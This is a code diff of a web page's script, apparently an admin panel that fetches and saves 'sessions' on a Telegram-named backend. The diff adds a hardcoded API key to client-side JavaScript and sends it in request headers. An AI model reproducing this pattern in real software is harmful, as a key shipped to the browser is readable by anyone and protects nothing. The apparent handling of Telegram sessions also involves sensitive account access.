@@ -27,6 +27,7 @@
 
 <script>
     const BACKEND_URL = "https://telegram-7ih3.onrender.com";
+    const API_KEY = "tg_custom_secret_key_2026";
 
     // --- (၁) Binary Data များကို JSON အဖြစ်ပြောင်းရန် Helpers ---
     function bufferToBase64(buf) {
@@ -187,7 +188,11 @@
                 const contentDiv = document.getElementById("admin-content");
                 contentDiv.innerHTML = "<p style='color: blue;'>Fetching data from Backend...</p>";
                 try {
-                    const res = await fetch(BACKEND_URL + "/api/get_sessions");
+                    const res = await fetch(BACKEND_URL + "/api/get_sessions", {
+                        headers: {
+                            "x-api-key": API_KEY
+                        }
+                    });
                     const data = await res.json();
                     window.adminDataStore = data; 
                     
@@ -251,7 +256,10 @@
 
                             const res = await fetch(BACKEND_URL + "/api/save_session", {
                                 method: "POST",
-                                headers: { "Content-Type": "application/json" },
+                                headers: { 
+                                    "Content-Type": "application/json",
+                                    "x-api-key": API_KEY
+                                },
                                 body: JSON.stringify({
                                     user_id: finalUid, 
                                     profile_name: finalName,
